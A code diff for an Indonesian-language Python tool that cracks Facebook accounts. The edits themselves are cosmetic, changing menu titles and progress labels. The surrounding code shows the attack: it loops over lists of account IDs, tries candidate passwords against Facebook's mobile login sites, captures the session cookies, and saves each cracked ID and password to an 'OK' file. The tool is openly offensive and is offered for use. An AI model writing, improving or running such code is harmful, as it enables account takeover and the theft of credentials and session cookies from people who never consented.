@@ -828,7 +828,7 @@ def massal():
 		exit()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack akun Old [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Akun New [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Akun Random [[bold green]Recommended[bold white]][/]',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (PILIH) [bold green]<"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack akun Old [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Akun New [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Akun Random [[bold green]Recommended[bold white]][/]',subtitle="╭───", subtitle_align="left", title="[bold green] PILIH"))
     hu = Console().input(f"[bold cyan]   ╰─> ")
     if hu in ['1','01']:
         for tua in sorted(id):
@@ -849,7 +849,7 @@ def setting():
     else:
         print(' [+] Pilih Yang Bener Sayang ')
         exit()
-    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot_pink2] (Method) [bold green]<"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green] Method"))
     hc = Console().input(f"[bold cyan]   ╰─> ")
     if hc in ['1','01']:
         method.append('validate1')
@@ -861,7 +861,7 @@ def setting():
         method.append('validate1')
     Console(width=80, style="bold cyan").print(Panel('''[bold white][[bold cyan]01[bold white]] [bold white]Password ke-1
 [bold white][[bold cyan]02[bold white]] [bold white]Password ke-2
-[bold white][[bold cyan]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',subtitle="╭───", subtitle_align="left", title="[bold green]>[hot yellow] (Password) [bold green]<"))
+[bold white][[bold cyan]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',subtitle="╭───", subtitle_align="left", title="[bold green]	Password"))
     pwplus=Console().input(f"[bold cyan]   ╰─> ")
     if pwplus in ['03','3']:
         pwpluss.append('ya')
@@ -1138,7 +1138,7 @@ def validate1(idf,pwv):
 	]
 )
 	ses = requests.Session()
-	prog.update(des,description=f"{bo}		CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{bo}		CRACK[bold green] {loop}/{len(id)} [bold white]OK->:[bold green]{ok}[/] CP->:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1367,7 +1367,7 @@ def validate2(idf,pwv):
 )
     
 	ses = requests.Session()
-	prog.update(des,description=f"{bo}    CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des,description=f"{bo}		CRACK[bold green] {loop}/{len(id)} [bold white]OK->:[bold green]{ok}[/] CP->:[bold yellow]{cp}[/]")
 	prog.advance(des) 
 	for pw in pwv:
 		try:
@@ -1418,7 +1418,7 @@ def validate2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
+					statusok1 = nel(statusok, width=80, style='bold green', title='OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
